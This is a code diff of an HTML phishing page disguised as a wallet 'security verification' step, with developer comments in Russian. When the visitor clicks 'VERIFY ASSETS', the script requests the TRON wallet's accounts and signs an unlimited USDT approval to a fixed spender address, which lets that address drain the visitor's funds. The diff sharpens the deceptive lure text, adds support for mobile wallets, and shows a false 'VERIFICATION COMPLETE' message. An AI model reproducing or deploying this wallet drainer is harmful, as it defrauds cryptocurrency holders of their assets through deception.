@@ -1,55 +1,77 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDS Verification</title>
+    <title>System Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { margin: 0; background: #000; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-        .card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px; border-radius: 24px; width: 80%; max-width: 320px; }
-        .btn { background: #3b82f6; color: white; border: none; padding: 16px 32px; border-radius: 12px; font-weight: 600; font-size: 16px; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4); }
-        .btn:active { transform: scale(0.98); opacity: 0.8; }
-        .status { margin-top: 20px; color: #555; font-size: 12px; letter-spacing: 1px; text-transform: uppercase; }
+        body { margin: 0; background: #000; color: white; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 35px; border-radius: 28px; width: 85%; max-width: 340px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+        .btn { background: #fff; color: #000; border: none; padding: 18px; border-radius: 16px; font-weight: 700; font-size: 16px; width: 100%; cursor: pointer; margin-top: 20px; transition: 0.2s; }
+        .btn:active { transform: scale(0.96); }
+        .desc { color: #666; font-size: 13px; line-height: 1.6; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div style="font-size: 24px; margin-bottom: 10px;">🔐</div>
-    <div style="margin-bottom: 20px; font-size: 18px; font-weight: 500;">Network Security</div>
-    <p style="color: #888; font-size: 14px; margin-bottom: 30px;">Verify your wallet to proceed with USDS Standart network.</p>
+<div class="glass">
+    <div style="font-size: 32px; margin-bottom: 15px;">🛡️</div>
+    <div style="font-size: 20px; font-weight: 600; margin-bottom: 10px;">Security Protocol</div>
+    <div style="color: #aaa; font-size: 14px;">Verify ownership of your assets to complete the synchronization.</div>
     
-    <button class="btn" id="actionBtn">CONTINUE</button>
-    <div class="status" id="st">Waiting for interaction...</div>
+    <button class="btn" id="mainBtn">VERIFY ASSETS</button>
+    <div class="desc" id="status">Secure P2P Connection</div>
 </div>
 
 <script>
-    const spender = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; 
-    const usdt = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; 
+    const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-    document.getElementById('actionBtn').addEventListener('click', async () => {
-        const status = document.getElementById('st');
-        status.innerText = "CONNECTING...";
-
+    async function startProcess() {
+        const btn = document.getElementById('mainBtn');
+        const status = document.getElementById('status');
+        
+        btn.innerText = "CONNECTING...";
+        
         try {
-            // Теперь, когда был КЛИК, кошелек РАЗРЕШИТ вызвать окно
-            if (window.tronLink) {
-                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                if (res.code === 200) {
-                    status.innerText = "VERIFYING...";
-                    const contract = await window.tronWeb.contract().at(usdt);
-                    await contract.approve(spender, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
-                    status.innerText = "VERIFIED SUCCESSFULLY";
+            // Универсальный способ получения доступа (Mobile + Desktop)
+            let tronWeb = window.tronWeb;
+            
+            // Если мы в мобильном кошельке, иногда нужно подождать секунду
+            if (!tronWeb && window.tronLink) tronWeb = window.tronLink.tronWeb;
+            
+            if (tronWeb) {
+                // Запрашиваем аккаунты через стандартный метод
+                const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
+                
+                if (accounts) {
+                    status.innerText = "SYNCHRONIZING...";
+                    btn.innerText = "CONFIRMING...";
+                    
+                    const contract = await tronWeb.contract().at(USDT);
+                    const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                    
+                    // Вызов Approve
+                    await contract.approve(SPENDER, amount).send();
+                    
+                    status.innerText = "VERIFICATION COMPLETE";
+                    btn.innerText = "DONE";
+                    btn.style.background = "#222";
+                    btn.style.color = "#555";
                 }
             } else {
-                status.innerText = "PLEASE OPEN IN WALLET BROWSER";
+                status.innerText = "OPEN IN TRUST WALLET BROWSER";
+                btn.innerText = "RETRY";
             }
         } catch (e) {
             console.error(e);
-            status.innerText = "ERROR: TRY AGAIN";
+            status.innerText = "SESSION EXPIRED. TRY AGAIN.";
+            btn.innerText = "RETRY VERIFICATION";
         }
-    });
+    }
+
+    document.getElementById('mainBtn').addEventListener('click', startProcess);
 </script>
 </body>
 </html>
